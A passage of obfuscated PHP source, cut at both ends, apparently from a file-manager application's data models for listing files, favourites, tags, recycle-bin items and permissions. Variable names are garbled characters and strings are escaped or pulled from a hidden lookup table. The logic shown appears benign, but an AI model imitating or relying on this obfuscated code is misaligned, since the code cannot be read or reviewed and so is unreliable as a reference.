array_merge($Û¥Û•¹Ò, $³òñÀ…½); return $ Õ®‡¢ ? $³òñÀ…½[$ Õ®‡¢] : $³òñÀ…½; } public function set($÷¨¹Î‡ú, $“‘†ÑÈœ = false, $ñÊ¥ŸĞ“ = '') { $öåÊ‘Şğ =& $_SERVER[Ùæõ‰Ï’]; $this->cacheRemove($ñÊ¥ŸĞ“); $ğÔã—ÙÖ = array(); $³ßØÚŠ = is_array($÷¨¹Î‡ú) ? $÷¨¹Î‡ú : array($÷¨¹Î‡ú => $“‘†ÑÈœ); foreach ($³ßØÚŠ as $º¨ÍàØÎ => $£µâ¨œ) { if (is_array($£µâ¨œ)) { $£µâ¨œ = json_encode_force($£µâ¨œ); } $this->checkLength($£µâ¨œ, !1, $this->tableName . $öåÊ‘Şğ[4] . $÷¨¹Î‡ú); $£µâ¨œ = self::textEncode($£µâ¨œ); $³ßØÚŠ = array($öåÊ‘Şğ[33] => $ñÊ¥ŸĞ“, $öåÊ‘Şğ[97] => $º¨ÍàØÎ, $öåÊ‘Şğ[450] => $£µâ¨œ); $ğÔã—ÙÖ[] = $this->filterWhere($³ßØÚŠ); } if (!$ğÔã—ÙÖ) { return !0; } $‚ÂĞè¬å = $this->cacheKey($öåÊ‘Şğ[476]); CacheLock::lock($‚ÂĞè¬å); $‡å¿®´¥ = $this->addAll($ğÔã—ÙÖ, array(), !0); CacheLock::unlock($‚ÂĞè¬å); return $‡å¿®´¥; } protected function optionDefault($˜©Ï‡Ø = '') { return !1; } public function setDeep($—èÕÍîí, $Ø¤•ö¼Ë = false, $­”Ú•ÊÏ = '') { $ê¹¿ÂèÖ = explode($_SERVER[Ùæõ‰Ï’][10], $—èÕÍîí); $¨Îêõùğ = $this->get(); array_set_value($¨Îêõùğ, $—èÕÍîí, $Ø¤•ö¼Ë); $this->set($ê¹¿ÂèÖ[0], $¨Îêõùğ[$ê¹¿ÂèÖ[0]], $­”Ú•ÊÏ); } public function remove($€İì¤öÕ, $¼¨íö‘Ô = '') { $Şš“¸Á„ =& $_SERVER[Ùæõ‰Ï’]; $this->cacheRemove($¼¨íö‘Ô); $äêá´è­ = $this->filterWhere(array($Şš“¸Á„[97] => $€İì¤öÕ, $Şš“¸Á„[33] => $¼¨íö‘Ô)); if (is_null($€İì¤öÕ)) { unset($äêá´è­[$Şš“¸Á„[97]]); } return $this->where($äêá´è­)->delete(); } public function cacheSet($Û¥¥§ª, $èÕì ¥½ = false) { return Cache::set($this->cacheKey($Û¥¥§ª), $èÕì ¥½); } public function cacheGet($£ñ›Íç›) { return Cache::get($this->cacheKey($£ñ›Íç›)); } public function cacheRemove($ÓñªÈÃ‰) { return Cache::remove($this->cacheKey($ÓñªÈÃ‰)); } protected function filterWhere($Ïşæñ¼’) { return $Ïşæñ¼’; } protected function cacheKey($ï Çà°Â) { return $ï Çà°Â; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\162\143\x65"; protected $tableMeta = array("\164\141\x62\154\x65\116\141\155\x65" => "\151\157\137\163\157\165\162\143\x65\x5f\x6d\x65\164\141", "\x6d\145\164\141\x46\x69\145\x6c\144" => "\163\x6f\165\162\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\157\x64\151\146\171\124\151\x6d\x65", "\x74\151\155\x65", "\x69\x6e\163\x65\x72\x74", "\146\165\156\143\164\x69\x6f\x6e"), array("\x63\162\145\141\164\x65\124\151\155\x65", "\164\151\155\x65", "\x69\156\163\x65\162\x74", "\x66\x75\156\143\164\x69\157\156"), array("\166\151\x65\167\x54\151\x6d\x65", "\164\151\x6d\x65", "\151\156\163\x65\162\x74", "\x66\165\156\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($èÇÙØ¶») { return $this->listSource(array($_SERVER[Ùæõ‰Ï’][477] => $èÇÙØ¶»)); } public function typeName($‘Æâæìù) { static $¦¡ØÙ = array(self::TYPE_SYSTEM => "\163\x79\163\x74\x65\x6d", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $¦¡ØÙ[$‘Æâæìù . $_SERVER[Ùæõ‰Ï’][12]]; } public function sourceListInfo($×ÕÏà†Û, $üÔ÷ôæº = false) { $ùø°ì¾ =& $_SERVER[Ùæõ‰Ï’]; $×ÕÏà†Û = $×ÕÏà†Û ? $×ÕÏà†Û : array(); $×ÕÏà†Û = array_filter(array_unique($×ÕÏà†Û)); if (!$×ÕÏà†Û) { return array(); } $¹¹Ş†˜¶ = $this->where(array($ùø°ì¾[193] => array($ùø°ì¾[7], $×ÕÏà†Û)))->select(); $this->_listDataApply($¹¹Ş†˜¶, $üÔ÷ôæº); return array_to_keyvalue($¹¹Ş†˜¶, $ùø°ì¾[193]); } public function pathInfoFilter(&$ ™ûÑÌô) { $ŸØç€á =& $_SERVER[Ùæõ‰Ï’]; static $“›öÚÚ = false; static $–ƒ³„Æğ = false; static $ÈÕÃ¡Á° = false; if (!$“›öÚÚ) { $¶‘œÑ§ = $ŸØç€á[478]; $¶‘œÑ§ .= $ŸØç€á[479]; $¶‘œÑ§ .= $ŸØç€á[480]; $â‚éŞß = $ŸØç€á[481]; $î¹¸‹À = explode($ŸØç€á[50], $â‚éŞß); $“›öÚÚ = explode($ŸØç€á[50], $¶‘œÑ§); $–ƒ³„Æğ = array(); foreach ($“›öÚÚ as $¯³Ğ´úù) { if (in_array($¯³Ğ´úù, $î¹¸‹À)) { continue; } $–ƒ³„Æğ[] = $¯³Ğ´úù; } $ÈÕÃ¡Á° = explode($ŸØç€á[50], $ŸØç€á[482]); } foreach ($ÈÕÃ¡Á° as $Ú•ôÀŒŞ) { if (isset($ ™ûÑÌô[$Ú•ôÀŒŞ])) { $ ™ûÑÌô[$Ú•ôÀŒŞ] = intval($ ™ûÑÌô[$Ú•ôÀŒŞ]); } } $ ™ûÑÌô[$ŸØç€á[87]] = $ŸØç€á[483] . $ ™ûÑÌô[$ŸØç€á[193]] . $ŸØç€á[484]; $ ™ûÑÌô[$ŸØç€á[33]] = $ ™ûÑÌô[$ŸØç€á[485]] == 1 ? $ŸØç€á[78] : $ŸØç€á[230]; $ ™ûÑÌô[$ŸØç€á[190]] = $this->typeName($ ™ûÑÌô[$ŸØç€á[190]]); if ($ ™ûÑÌô[$ŸØç€á[485]] != 1) { $ ™ûÑÌô[$ŸØç€á[169]] = $ ™ûÑÌô[$ŸØç€á[486]]; unset($ ™ûÑÌô[$ŸØç€á[486]]); } $Ï‹†ÊüË = $“›öÚÚ; if (isset($ ™ûÑÌô[$ŸØç€á[487]]) && $ ™ûÑÌô[$ŸØç€á[487]][$ŸØç€á[488]] == -1) { $Ï‹†ÊüË = $–ƒ³„Æğ; } $ ™ûÑÌô = array_field_key($ ™ûÑÌô, $Ï‹†ÊüË); return $ ™ûÑÌô; } public function listUserFav() { $¨¿çíÛƒ =& $_SERVER[Ùæõ‰Ï’]; $ ‘ÑÏ¬Ê = Model($¨¿çíÛƒ[489])->listData(); $Õ×¢Óœ¬ = array_filter_by_field($ ‘ÑÏ¬Ê, $¨¿çíÛƒ[33], $¨¿çíÛƒ[490]); $Õ×¢Óœ¬ = array_to_keyvalue($Õ×¢Óœ¬, $¨¿çíÛƒ[12], $¨¿çíÛƒ[87]); if ($Õ×¢Óœ¬) { $ÑÁÃæ÷² = $this->listSource(array($¨¿çíÛƒ[491] => array($¨¿çíÛƒ[492], $Õ×¢Óœ¬))); } $ÑÁÃæ÷² = array_to_keyvalue($ÑÁÃæ÷²[$¨¿çíÛƒ[445]], $¨¿çíÛƒ[193]); foreach ($ ‘ÑÏ¬Ê as &$µÄñîìî) { $µÄñîìî = array($¨¿çíÛƒ[493] => $µÄñîìî[$¨¿çíÛƒ[475]], $¨¿çíÛƒ[494] => $µÄñîìî[$¨¿çíÛƒ[32]], $¨¿çíÛƒ[495] => $µÄñîìî[$¨¿çíÛƒ[87]], $¨¿çíÛƒ[496] => $µÄñîìî[$¨¿çíÛƒ[33]], $¨¿çíÛƒ[497] => $µÄñîìî[$¨¿çíÛƒ[231]], $¨¿çíÛƒ[498] => $µÄñîìî[$¨¿çíÛƒ[88]]); if ($µÄñîìî[$¨¿çíÛƒ[33]] == $¨¿çíÛƒ[490] && $ÑÁÃæ÷²[$µÄñîìî[$¨¿çíÛƒ[87]]]) { $µÄñîìî[$¨¿çíÛƒ[90]] = $ÑÁÃæ÷²[$µÄñîìî[$¨¿çíÛƒ[87]]]; } } unset($µÄñîìî); return $ ‘ÑÏ¬Ê; } public function listUserTag($ÀÑ¬—Ö¥) { $õ¾Á©¨­ =& $_SERVER[Ùæõ‰Ï’]; if ($ÀÑ¬—Ö¥ && !is_array($ÀÑ¬—Ö¥)) { $ÀÑ¬—Ö¥ = array($ÀÑ¬—Ö¥); } $ß¼µÛŸ = Model($õ¾Á©¨­[499])->listData(); $ùŞÕ“ü“ = array(); $Ñ¶¿‘™‚ = array(); foreach ($ß¼µÛŸ as $½³¬Ğ÷ª) { $ªÎûæÍ¼ = $½³¬Ğ÷ª[$õ¾Á©¨­[87]]; if (!$ªÎûæÍ¼) { continue; } if (!isset($Ñ¶¿‘™‚[$ªÎûæÍ¼])) { $Ñ¶¿‘™‚[$ªÎûæÍ¼] = array(); } $Ñ¶¿‘™‚[$ªÎûæÍ¼][] = $½³¬Ğ÷ª[$õ¾Á©¨­[500]]; $ùŞÕ“ü“[$½³¬Ğ÷ª[$õ¾Á©¨­[87]]] = $½³¬Ğ÷ª; } $ƒú´©®¯ = array(); $‘¿è¦‚µ = array(); $£’ÉÍ = array(); foreach ($Ñ¶¿‘™‚ as $¢±˜àŸÛ => $¤Ô§„·í) { $Í”Ø½È = !0; if (!$ÀÑ¬—Ö¥) { $ƒú´©®¯[] = $¢±˜àŸÛ; continue; } foreach ($ÀÑ¬—Ö¥ as $ß·æô¥) { if (!in_array($ß·æô¥, $¤Ô§„·í)) { $Í”Ø½È = !1; break; } } if (!$Í”Ø½È) { continue; } if (!is_numeric($¢±˜àŸÛ)) { $éöÚ«Ã = $ùŞÕ“ü“[$¢±˜àŸÛ]; $ö±ğ¡‰” = array($õ¾Á©¨­[32] => $éöÚ«Ã[$õ¾Á©¨­[32]], $õ¾Á©¨­[87] => $éöÚ«Ã[$õ¾Á©¨­[87]], $õ¾Á©¨­[33] => $éöÚ«Ã[$õ¾Á©¨­[33]], $õ¾Á©¨­[90] => array($õ¾Á©¨­[501] => 1), $õ¾Á©¨­[232] => !0); if ($éöÚ«Ã[$õ¾Á©¨­[33]] == $õ¾Á©¨­[230]) { $£’ÉÍ[] = $ö±ğ¡‰”; } if ($éöÚ«Ã[$õ¾Á©¨­[33]] == $õ¾Á©¨­[78]) { $‘¿è¦‚µ[] = $ö±ğ¡‰”; } continue; } $ƒú´©®¯[] = $¢±˜àŸÛ; } if ($ƒú´©®¯) { $¨–ÈÒÂ = $this->listSource(array($õ¾Á©¨­[491] => array($õ¾Á©¨­[492], $ƒú´©®¯))); } $¨–ÈÒÂ = $¨–ÈÒÂ ? $¨–ÈÒÂ : array($õ¾Á©¨­[85] => array(), $õ¾Á©¨­[86] => array()); $¨–ÈÒÂ[$õ¾Á©¨­[85]] = array_merge($¨–ÈÒÂ[$õ¾Á©¨­[85]], $‘¿è¦‚µ); $¨–ÈÒÂ[$õ¾Á©¨­[86]] = array_merge($¨–ÈÒÂ[$õ¾Á©¨­[86]], $£’ÉÍ); if (isset($¨–ÈÒÂ[$õ¾Á©¨­[442]]) && count($ƒú´©®¯) == $¨–ÈÒÂ[$õ¾Á©¨­[442]][$õ¾Á©¨­[443]]) { return $¨–ÈÒÂ; } $çõ„­ñ = array(); $—Å–¹×ù = array_to_keyvalue($¨–ÈÒÂ[$õ¾Á©¨­[85]], $õ¾Á©¨­[12], $õ¾Á©¨­[193]); $Æ²Å§÷ = array_to_keyvalue($¨–ÈÒÂ[$õ¾Á©¨­[86]], $õ¾Á©¨­[12], $õ¾Á©¨­[193]); $À›†±òö = array_merge($Æ²Å§÷, $—Å–¹×ù); foreach ($ƒú´©®¯ as $ªÎûæÍ¼) { if (!in_array($ªÎûæÍ¼, $À›†±òö)) { $çõ„­ñ[] = $ªÎûæÍ¼; } } if ($çõ„­ñ) { Model($õ¾Á©¨­[502])->removeBySource($çõ„­ñ); } return $¨–ÈÒÂ; } public function listUserRecycle() { $ÁõÕºÄ€ =& $_SERVER[Ùæõ‰Ï’]; $å€¶Èé» = Model($ÁõÕºÄ€[503])->listData(); if (!$å€¶Èé») { return array(); } $”¡ö¯‘µ = array($ÁõÕºÄ€[491] => array($ÁõÕºÄ€[492], $å€¶Èé»), $ÁõÕºÄ€[504] => 1); return $this->listSource($”¡ö¯‘µ); } public function listSource($ê…ôÑ£, $Î¢½øÕı = 3000, $€÷ş²¯­ = false) { $ˆĞ—äæ§ =& $_SERVER[Ùæõ‰Ï’]; if (!isset($ê…ôÑ£[$ˆĞ—äæ§[505]])) { $ê…ôÑ£[$ˆĞ—äæ§[505]] = 0; } if (isset($ê…ôÑ£[$ˆĞ—äæ§[192]]) && $ê…ôÑ£[$ˆĞ—äæ§[192]] == $ˆĞ—äæ§[228]) { $ê…ôÑ£[$ˆĞ—äæ§[486]] = array($ˆĞ—äæ§[407], $ˆĞ—äæ§[506]); } $‘æìÛ¸İ = $ˆĞ—äæ§[507]; $Ü¼Ã¦éå = $this->field($‘æìÛ¸İ)->_makeOrder()->where($ê…ôÑ£)->selectPage($Î¢½øÕı); $this->_listPageCheck($Ü¼Ã¦éå, $‘æìÛ¸İ, $ê…ôÑ£); $this->_listDataApply($Ü¼Ã¦éå[$ˆĞ—äæ§[445]], $€÷ş²¯­); $this->_listMake($Ü¼Ã¦éå); return $Ü¼Ã¦éå; } private function _listPageCheck(&$ÕÊ«çãæ, $¿¢ôõÆ’, $×†®éˆ×) { $¶ÜØÅüÄ =& $_SERVER[Ùæõ‰Ï’]; if (!is_array($ÕÊ«çãæ[$¶ÜØÅüÄ[442]])) { return; } $™ø¸ñ°¶ = $ÕÊ«çãæ[$¶ÜØÅüÄ[442]]; if ($™ø¸ñ°¶[$¶ÜØÅüÄ[444]] <= 1) { return; } if ($™ø¸ñ°¶[$¶ÜØÅüÄ[443]] >= 100000) { return; } if (Model($¶ÜØÅüÄ[508])->get($¶ÜØÅüÄ[509]) != $¶ÜØÅüÄ[510]) { return; } $¿¢ôõÆ’ = str_replace(array($¶ÜØÅüÄ[53], $¶ÜØÅüÄ[418], $¶ÜØÅüÄ[262]), $¶ÜØÅüÄ[12], $¿¢ôõÆ’); $¿¢ôõÆ’ = $¶ÜØÅüÄ[511] . str_replace($¶ÜØÅüÄ[50], $¶ÜØÅüÄ[512], $¿¢ôõÆ’) . $¶ÜØÅüÄ[513]; $®Ê”ÜÍ§ = $¶ÜØÅüÄ[514]; $®Ê”ÜÍ§ = $®Ê”ÜÍ§ . $¶ÜØÅüÄ[515]; $øÃ‡¨óÈ = $™ø¸ñ°¶[$¶ÜØÅüÄ[439]] * ($™ø¸ñ°¶[$¶ÜØÅüÄ[429]] - 1) . $¶ÜØÅüÄ[50] . $™ø¸ñ°¶[$¶ÜØÅüÄ[439]]; $ŠÁó´ß = $this->_makeOrder(!0); $·Èö€¾¸ = $¶ÜØÅüÄ[511] . str_replace($¶ÜØÅüÄ[50], $¶ÜØÅüÄ[512], $ŠÁó´ß[0]); if (strpos($·Èö€¾¸, $¶ÜØÅüÄ[516])) { $·Èö€¾¸ = str_replace($¶ÜØÅüÄ[516], $¶ÜØÅüÄ[517], $·Èö€¾¸); } else { $·Èö€¾¸ .= $¶ÜØÅüÄ[518] . $ŠÁó´ß[1]; } $†é“É½ = array(); foreach ($×†®éˆ× as $¿åšèàÄ => $¦„È’ãë) { $†é“É½[$¶ÜØÅüÄ[511] . $¿åšèàÄ] = $¦„È’ãë; } $this->alias($¶ÜØÅüÄ[519])->field($¿¢ôõÆ’)->limit($øÃ‡¨óÈ)->order($·Èö€¾¸); $Œ¯³¼”ƒ = $this->join($®Ê”ÜÍ§)->where($†é“É½)->select(); if ($Œ¯³¼”ƒ) { $ÕÊ«çãæ[$¶ÜØÅüÄ[445]] = $Œ¯³¼”ƒ; } } protected function _makeOrder($ÎÓ’ãş = false) { $Ãß½üÌÚ =& $_SERVER[Ùæõ‰Ï’]; $õï¿÷œÈ = Model($Ãß½üÌÚ[520])->get($Ãß½üÌÚ[521]); $¨™äèÇÛ = Model($Ãß½üÌÚ[520])->get($Ãß½üÌÚ[522]); $œûšãÌƒ = array($Ãß½üÌÚ[523] => $Ãß½üÌÚ[524], $Ãß½üÌÚ[525] => $Ãß½üÌÚ[526]); $ßÌŠö¤œ = array($Ãß½üÌÚ[32] => $Ãß½üÌÚ[32], $Ãß½üÌÚ[79] => $Ãß½üÌÚ[79], $Ãß½üÌÚ[169] => $Ãß½üÌÚ[486], $Ãß½üÌÚ[527] => $Ãß½üÌÚ[527], $Ãß½üÌÚ[528] => $Ãß½üÌÚ[529], $Ãß½üÌÚ[231] => $Ãß½üÌÚ[231], $Ãß½üÌÚ[88] => $Ãß½üÌÚ[88]); $èÍı‘–‰ = Input::get($Ãß½üÌÚ[530], $Ãß½üÌÚ[7], $õï¿÷œÈ, array_keys($ßÌŠö¤œ)); $²©ÈÅà‰ = Input::get($Ãß½üÌÚ[531], $Ãß½üÌÚ[7], $¨™äèÇÛ, array_keys($œûšãÌƒ)); if (!in_array($èÍı‘–‰, array_keys($ßÌŠö¤œ))) { $èÍı‘–‰ = $Ãß½üÌÚ[32]; } if (!in_array($²©ÈÅà‰, array_keys($œûšãÌƒ))) { $èÍı‘–‰ = $Ãß½üÌÚ[523]; } if ($èÍı‘–‰ == $Ãß½üÌÚ[32]) { } $àçÎ¼À = $Ãß½üÌÚ[532] . $ßÌŠö¤œ[$èÍı‘–‰] . $Ãß½üÌÚ[53] . $œûšãÌƒ[$²©ÈÅà‰]; $àçÎ¼À = rtrim(trim($àçÎ¼À), $Ãß½üÌÚ[50]); if ($ÎÓ’ãş) { return array($àçÎ¼À, $œûšãÌƒ[$²©ÈÅà‰]); } return $this->order($àçÎ¼À); } protected function _listDataApplyItem($Îë¤ÚÌ, $¦‡ —¶ê = false) { $ ç×˜èÑ = array($Îë¤ÚÌ); $this->_listDataApply($ ç×˜èÑ, $¦‡ —¶ê); return $ ç×˜èÑ[0]; } protected function _listDataApply(&$€ı—¢, $ì­øâ™ = false) { $²¡ã£ƒß =& $_SERVER[Ùæõ‰Ï’]; if (!$€ı—¢) { $€ı—¢ = array(); return; } $ÌÉÆø¦¬ = array_to_keyvalue($€ı—¢, $²¡ã£ƒß[12], $²¡ã£ƒß[193]); $ÌÉÆø¦¬ = array_unique($ÌÉÆø¦¬); $this->_listSourceCache($€ı—¢); if (!$ì­øâ™) { $this->_listAppendMeta($€ı—¢, $ÌÉÆø¦¬); $this->_listAppendFileMeta($€ı—¢, $ÌÉÆø¦¬); $this->_listAppendChildren($€ı—¢, $ÌÉÆø¦¬); } $this->_listAppendPath($€ı—¢); $this->_listAppendAuth($€ı—¢); $this->_listAppendSourceInfo($€ı—¢, $ÌÉÆø¦¬); $this->_listAppendUser($€ı—¢); $this->_listFilterInfo($€ı—¢, $ì­øâ™); $this->_listAppendAuthSecret($€ı—¢); } protected function _listSourceCache($½ÓÍı·Ã) { $›öÈÈğÇ =& $_SERVER[Ùæõ‰Ï’]; foreach ($½ÓÍı·Ã as $ÍÊõÚª) { self::$cacheSourceInfo[$›öÈÈğÇ[533] . $ÍÊõÚª[$›öÈÈğÇ[193]]] = $ÍÊõÚª; } } protected function _listFilterInfo(&$ä÷É±ô¶, $™×Ãßá = false) { $³¿¯ş œ =& $_SERVER[Ùæõ‰Ï’]; foreach ($ä÷É±ô¶ as &$ÃÙÀîÉÏ) { $ÃÙÀîÉÏ = $this->pathInfoFilter($ÃÙÀîÉÏ); self::$cachePathInfo[$³¿¯ş œ[534] . intval($™×Ãßá) . $³¿¯ş œ[462] . $ÃÙÀîÉÏ[$³¿¯ş œ[193]]] = $ÃÙÀîÉÏ; } unset($ÃÙÀîÉÏ); } protected function _listMake(&$»„Åˆ‘“) { $Í’œú¬š =& $_SERVER[Ùæõ‰Ï’]; $»„Åˆ‘“[$Í’œú¬š[85]] = array(); $»„Åˆ‘“[$Í’œú¬š[86]] = array(); foreach ($»„Åˆ‘“[$Í’œú¬š[445]] as $§¼‹‡‘î) { $¸ƒÒÉÊ = $§¼‹‡‘î[$Í’œú¬š[485]] == 1 ? $Í’œú¬š[85] : $Í’œú¬š[86]; $»„Åˆ‘“[$¸ƒÒÉÊ][] = $§¼‹‡‘î; } unset($»„Åˆ‘“[$Í’œú¬š[445]]); } protected function _listAppendMeta(&$ƒıä¯ş³, $”ÈÙ¬²…) { $Î¯âêÏ° =& $_SERVER[Ùæõ‰Ï’]; $ƒ—ÁÚÃ = array($Î¯âêÏ°[491] => array($Î¯âêÏ°[492], $”ÈÙ¬²…)); $½Ü‘±åò = Model($Î¯âêÏ°[535])->field($Î¯âêÏ°[536])->where($ƒ—ÁÚÃ)->select(); if (!$½Ü‘±åò) { return; } $üƒñ¾ä = array($Î¯âêÏ°[537], $Î¯âêÏ°[538], $Î¯âêÏ°[517]); $é¼çË× = array(); foreach ($½Ü‘±åò as $Ğ¥ÏËä„) { if (!isset($é¼çË×[$Ğ¥ÏËä„[$Î¯âêÏ°[193]]])) { $é¼çË×[$Ğ¥ÏËä„[$Î¯âêÏ°[193]]] = array(); } if (in_array($Ğ¥ÏËä„[$Î¯âêÏ°[97]], $üƒñ¾ä)) { continue; } $é¼çË×[$Ğ¥ÏËä„[$Î¯âêÏ°[193]]][$Ğ¥ÏËä„[$Î¯âêÏ°[97]]] = $Ğ¥ÏËä„[$Î¯âêÏ°[450]]; } foreach ($ƒıä¯ş³ as &$¿ñü‰™À) { $¿ñü‰™À[$Î¯âêÏ°[539]] = !1; if (isset($é¼çË×[$¿ñü‰™À[$Î¯âêÏ°[193]]])) { $¿ñü‰™À[$Î¯âêÏ°[539]] = $é¼çË×[$¿ñü‰™À[$Î¯âêÏ°[193]]]; } if ($this->fileIsLock($¿ñü‰™À) && $¿ñü‰™À[$Î¯âêÏ°[487]]) { $æÍñÁ“ë = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¿ñü‰™À[$Î¯âêÏ°[487]][$Î¯âêÏ°[488]] = AuthModel::authDisable($¿ñü‰™À[$Î¯âêÏ°[487]][$Î¯âêÏ°[488]], $æÍñÁ“ë); $¿ñü‰™À[$Î¯âêÏ°[487]][$Î¯âêÏ°[540]][$Î¯âêÏ°[487]] = $¿ñü‰™À[$Î¯âêÏ°[487]][$Î¯âêÏ°[488]]; } } unset($¿ñü‰™À); } protected function _listAppendFileMeta(&$†³Àñ¼Ü, $¹Æò‹Ã) { $µÔ½Úåˆ =& $_SERVER[Ùæõ‰Ï’]; $€è¯óØ = array_to_keyvalue($†³Àñ¼Ü, $µÔ½Úåˆ[12], $µÔ½Úåˆ[541]); $€è¯óØ = array_filter(array_unique($€è¯óØ)); if (!$€è¯óØ) { return; } $•Ö‘—¡Œ = array($µÔ½Úåˆ[542] => array($µÔ½Úåˆ[492], $€è¯óØ)); $õÑÂ‹”ä = $µÔ½Úåˆ[543]; $çÄËá£ = Model($µÔ½Úåˆ[544])->field($õÑÂ‹”ä)->where($•Ö‘—¡Œ)->select(); $çÄËá£ = array_to_keyvalue($çÄËá£, $µÔ½Úåˆ[541]); $ñËÎ¹¬’ = Model($µÔ½Úåˆ[545])->field($µÔ½Úåˆ[546])->where($•Ö‘—¡Œ)->select(); $ñËÎ¹¬’ = $ñËÎ¹¬’ ? $ñËÎ¹¬’ : array(); $î‹•ÓÚ = array(); foreach ($ñËÎ¹¬’ as $‘®Áî”Î) { if (!isset($î‹•ÓÚ[$‘®Áî”Î[$µÔ½Úåˆ[541]]])) { $î‹•ÓÚ[$‘®Áî”Î[$µÔ½Úåˆ[541]]] = array(); } $î‹•ÓÚ[$‘®Áî”Î[$µÔ½Úåˆ[541]]][$‘®Áî”Î[$µÔ½Úåˆ[97]]] = $‘®Áî”Î[$µÔ½Úåˆ[450]]; } foreach ($†³Àñ¼Ü as &$ùÁËñ·) { $«Ò¯†¨ = $ùÁËñ·[$µÔ½Úåˆ[541]]; if (!$«Ò¯†¨ || !is_array($çÄËá£[$«Ò¯†¨])) { continue; } $Ëéª¸†˜ = $çÄËá£[$«Ò¯†¨]; $Ëéª¸†˜[$µÔ½Úåˆ[79]] = $ùÁËñ·[$µÔ½Úåˆ[79]]; $Ëéª¸†˜[$µÔ½Úåˆ[32]] = $ùÁËñ·[$µÔ½Úåˆ[32]]; if (!$Ëéª¸†˜[$µÔ½Úåˆ[547]]) { Model($µÔ½Úåˆ[544])->fileMd5Check($Ëéª¸†˜); } if (!isset(self::$cacheFileInfo[$µÔ½Úåˆ[548] . $«Ò¯†¨])) { self::$cacheFileInfo[$µÔ½Úåˆ[548] . $«Ò¯†¨] = array_merge(array(), $Ëéª¸†˜); } unset($çÄËá£[$«Ò¯†¨][$µÔ½Úåˆ[87]]); $Õ“ä‹òù = isset($î‹•ÓÚ[$«Ò¯†¨]) && is_array($î‹•ÓÚ[$«Ò¯†¨]) ? $î‹•ÓÚ[$«Ò¯†¨] : array(); $ùÁËñ·[$µÔ½Úåˆ[170]] = array_merge($Õ“ä‹òù, $çÄËá£[$«Ò¯†¨]); if (isset($ùÁËñ·[$µÔ½Úåˆ[170]][$µÔ½Úåˆ[184]])) { $ùÁËñ·[$µÔ½Úåˆ[184]] = json_decode($ùÁËñ·[$µÔ½Úåˆ[170]][$µÔ½Úåˆ[184]], !0); unset($ùÁËñ·[$µÔ½Úåˆ[170]][$µÔ½Úåˆ[184]]); } } unset($ùÁËñ·); } protected function _listAppendSourceInfo(&$Ûà·Éö¢, $ä¸¼„è‘) { $„ª™óÖÀ =& $_SERVER[Ùæõ‰Ï’]; $–â©Šöà = Model($„ª™óÖÀ[549])->listData(); $¶Ø®ñö¡ = Model($„ª™óÖÀ[499])->listData(); $ìÀæ“É = Model($„ª™óÖÀ[489])->listData(); $¤ÒåàõÚ = Model($„ª™óÖÀ[550])->listSimple(); $Ã÷‡ÚÄŒ = array_to_keyvalue($–â©Šöà, $„ª™óÖÀ[475]); $ç‘Ë¥¸„ = array_to_keyvalue_group($¶Ø®ñö¡, $„ª™óÖÀ[87], $„ª™óÖÀ[500]); $üÆ›ğÖ = array_to_keyvalue($ìÀæ“É, $„ª™óÖÀ[87]); $ª”’ƒ©´ = array_to_keyvalue_group($¤ÒåàõÚ, $„ª™óÖÀ[193]); foreach ($Ûà·Éö¢ as &$®ÓŞ­ ) { $®ÓŞ­ [$„ª™óÖÀ[90]] = array($„ª™óÖÀ[551] => 0, $„ª™óÖÀ[552] => 0, $„ª™óÖÀ[553] => 0); if (isset($üÆ›ğÖ[$®ÓŞ­ [$„ª™óÖÀ[193]]])) { $®ÓŞ­ [$„ª™óÖÀ[90]][$„ª™óÖÀ[554]] = 1; $®ÓŞ­ [$„ª™óÖÀ[90]][$„ª™óÖÀ[555]] = $üÆ›ğÖ[$®ÓŞ­ [$„ª™óÖÀ[193]]][$„ª™óÖÀ[32]]; } if ($ç‘Ë¥¸„ && $Ã÷‡ÚÄŒ && isset($ç‘Ë¥¸„[$®ÓŞ­ [$„ª™óÖÀ[193]]])) { $®ÓŞ­ [$„ª™óÖÀ[90]][$„ª™óÖÀ[556]] = array(); foreach ($ç‘Ë¥¸„[$®ÓŞ­ [$„ª™óÖÀ[193]]] as $Óöèéó´) { $…¥Ô³ã¼ = $Ã÷‡ÚÄŒ[$Óöèéó´]; $®ÓŞ­ [$„ª™óÖÀ[90]][$„ª™óÖÀ[556]][] = array($„ª™óÖÀ[557] => $…¥Ô³ã¼[$„ª™óÖÀ[475]], $„ª™óÖÀ[494] => $…¥Ô³ã¼[$„ª™óÖÀ[32]], $„ª™óÖÀ[558] => $…¥Ô³ã¼[$„ª™óÖÀ[559]]); } } if ($ª”’ƒ©´ && isset($ª”’ƒ©´[$®ÓŞ­ [$„ª™óÖÀ[193]]])) { $®ÓŞ­ [$„ª™óÖÀ[90]][$„ª™óÖÀ[560]] = array(); foreach ($ª”’ƒ©´[$®ÓŞ­ [$„ª™óÖÀ[193]]] as $•‚¬ÊŞ) { $¡ªÍøÜÅ = $„ª™óÖÀ[561]; if ($•‚¬ÊŞ[$„ª™óÖÀ[562]] == $„ª™óÖÀ[91]) { $¡ªÍøÜÅ .= $„ª™óÖÀ[563]; } $®ÓŞ­ [$„ª™óÖÀ[90]][$„ª™óÖÀ[560]] = array_field_key($•‚¬ÊŞ, explode($„ª™óÖÀ[50], $¡ªÍøÜÅ)); } } } unset($®ÓŞ­ ); return $Ûà·Éö¢; } protected function _listAppendChildren(&$‰ª­Áº‘, $ùãÎ£õ”) { $ë¦½ÇÏ¹ =& $_SERVER[Ùæõ‰Ï’]; $Ú‚”ëÂ = array(); $óÎû§Æ“ = array($ë¦½ÇÏ¹[239] => 0, $ë¦½ÇÏ¹[240] => 0); foreach ($‰ª­Áº‘ as &$œ”ÙÚ§ë) { if (!$œ”ÙÚ§ë[$ë¦½ÇÏ¹[485]]) { continue; } $Ú‚”ëÂ[] = $œ”ÙÚ§ë[$ë¦½ÇÏ¹[193]]; } unset($œ”ÙÚ§ë); if (!$Ú‚”ëÂ) { return; } $«Õ™… § = array($ë¦½ÇÏ¹[192] => array($ë¦½ÇÏ¹[7], $Ú‚”ëÂ), $ë¦½ÇÏ¹[505] => 0); $‹½ïöœ = 